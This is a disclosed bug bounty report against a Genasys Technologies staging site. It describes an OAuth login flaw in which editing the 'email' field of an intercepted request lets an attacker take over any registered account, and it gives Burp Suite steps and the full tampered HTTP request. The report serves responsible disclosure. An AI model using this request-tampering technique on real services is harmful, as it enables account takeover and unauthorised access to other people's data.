@@ -1,0 +1,51 @@
+ReportLink:https://hackerone.com/reports/729960
+WeaknessName:Improper Access Control - Generic
+Reporter:https://hackerone.com/aaron_costello
+ReportedTo:Genasys Technologies(genasys)
+BountyAmount:
+Severity:high
+State:Closed
+DateOfDisclosure:24.12.2019 16:42:58
+
+Summary:
+
+## Summary:
+
+An attacker is able to login to any email account (that doesn't belong to him) through using the OAuth functionality (https://staging.genasystech.co.uk/d2c-api/v1/account/login/provider)
+
+## Steps To Reproduce:
+
+  1. Register an account with an email and verify it using the one time code that is asked upon registration, I registered ██████
+  2. Go to https://staging.genasystech.co.uk/d2c/, as this will log you out if you're logged in
+  3. Open Burp Suite and go to the log in page, make sure you have intercept requests 'on'
+  4. Choose 'Sign-in using Google'
+  5. Click 'Forward' on all requests until you can select a Gmail account. Then select one belonging to a different email (I chose ████████)
+  6. Keep forwarding the request until you see the request like below:
+
+```
+POST /d2c-api/v1/account/login/provider HTTP/1.1
+Host: staging.genasystech.co.uk
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
+Accept: application/json
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: https://staging.genasystech.co.uk/d2c/
+Content-Type: application/json-patch+json
+Content-Length: 1344
+Cookie: ASP.NET_SessionId=thu1bqkkwmat143llht2ese1
+Connection: close
+
+{"provider":"google","email":"███","emailVerified":true,"providerAccessToken":"eyJhbGciOiJSUzI1NiIsImtpZCI6IjVkY2U3ZTQxYWRkMTIxYjg2ZWQ0MDRiODRkYTc1NzM5NDY3ZWQyYmMiLCJ0eXAiOiJKV1QifQ.█████████.Aopb3FMRiHFNyP-MIZpRWKA9Lm4oJey-vWBlZbodqHTysWO1nlQzZPIAIsyypQ-eL6xKm3cT1Jjfa3OHEm7GNkOIuDl_--AjLV6cD8LN0WA6hq5Z8QaCevalcUBxyW3SKgku8NBP2DJLu_j9mIyy28wv5XfQzus14gmq4HIK4loRUxmdwd7xxHm0SHKw8N8FT6RIhIHCuMXtl7E6dUcTbS160wGJIyC18dn_elp8dE1XvDZQJpd-9I5sBAuc9pibEA1veub1gClFlpTJCLWmiZ4doa46ssvUDKB5e56WsI96FQqwmyKwX1uMVgWhWHERA9vHCkPmxJEuysGhaXvW_A","firstName":"Herald","lastName":"Big Deck"}
+```
+
+7. Edit the request by changing the "email" value to your account from step 1 (In my case ███████) and "emailVerified" is true
+8. The application will give you a JWT Authz token bound to ██████ instead of █████████
+
+
+## Supporting Material/References:
+
+████████
+
+## Impact
+
+An attacker can takeover any registered account.
